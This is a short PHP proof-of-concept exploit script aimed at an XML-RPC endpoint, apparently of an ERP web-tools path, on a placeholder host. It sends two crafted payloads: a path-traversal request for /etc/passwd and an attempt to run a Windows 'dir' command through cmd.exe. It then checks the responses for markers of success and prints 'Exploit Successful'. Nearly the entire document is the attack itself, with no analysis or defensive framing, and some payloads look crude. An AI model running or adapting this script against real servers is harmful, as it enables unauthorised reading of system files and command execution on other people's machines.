<?php
// Vulnerable host URL
$url = "http://vulnerable-host.com/webtools/control/xmlrpc";

// Function to execute the cURL request
function executeCurl($url, $xmlPayload)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: text/xml"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xmlPayload);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "Error: " . curl_error($ch);
    } else {
        // Check if the response indicates a successful exploit
        if (
            stripos($response, "root:") !== false ||
            stripos($response, "Volume in drive") !== false
        ) {
            echo "Exploit Successful:\n";
            echo $response;
            curl_close($ch);
            return true;
        } else {
            echo "PoC failed. Response received, but exploit may not have worked:\n";
            echo $response;
        }
    }

    curl_close($ch);
    return false;
}

// PoC 1: Attempt to read /etc/passwd
$xmlPayload1 = '<?xml version="1.0"?>
<methodCall>
  <methodName>example.createBlogPost</methodName>
  <params>
    <param>
      <value><string>../../../../../../etc/passwd</string></value>
    </param>
  </params>
</methodCall>';

echo "Attempting PoC 1...\n";
if (!executeCurl($url, $xmlPayload1)) {
    // PoC 2: Attempt to execute a command on Windows
    $xmlPayload2 = '<?xml version="1.0"?>
<methodCall>
  <methodName>performCommand</methodName>
  <params>
    <param>
      <value><string>../../../../../../windows/system32/cmd.exe?/c+dir+c:\</string></value>
    </param>
  </params>
</methodCall>';

    echo "\nPoC 1 failed. Attempting PoC 2...\n";
    executeCurl($url, $xmlPayload2);
}
?>
